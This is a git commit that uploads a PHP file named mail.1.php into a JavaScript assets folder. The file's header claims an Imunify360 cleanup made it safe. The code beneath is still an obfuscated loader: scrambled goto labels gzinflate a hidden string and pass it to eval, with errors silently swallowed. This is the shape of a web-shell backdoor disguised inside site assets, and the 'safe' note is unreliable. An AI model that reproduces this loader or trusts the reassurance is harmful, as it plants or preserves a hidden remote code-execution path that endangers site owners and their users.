fbaa24d663cbbfb4a33ca15bc1ba1d7b35193178
mikkalab <mikkalabofficial@gmail.com>
2026-04-14 22:17:03 +0200

    Add files via upload

---
+++ assets/dropdown/js/mail.1.php
@@ -0,0 +1,8 @@
+<?php
+
+/**
+* Note: This file may contain artifacts of previous malicious infection. 
+* However, the dangerous code have been removed, and the file is now safe to use.
+* Feel free to contact Imunify support team at https://www.imunify360.com/support/new
+*/
+ goto b20e3599447; E6239f64a7d: @($Ef807d30868 = $F14d195c8bb); goto ed9b6026f86; b0faa5398b5: b0e724f6b0d: goto d1ac1502a6b; ed9b6026f86: try { eval($Ef807d30868); } catch (d9E6A177Ca6 $bca91fff31d) { } goto E9b88a5b2f9; d1ac1502a6b: $F14d195c8bb = gzinflate(substr($cabd28f1f6c, 3)); goto E6239f64a7d; E9b88a5b2f9: c97f610b2d3:
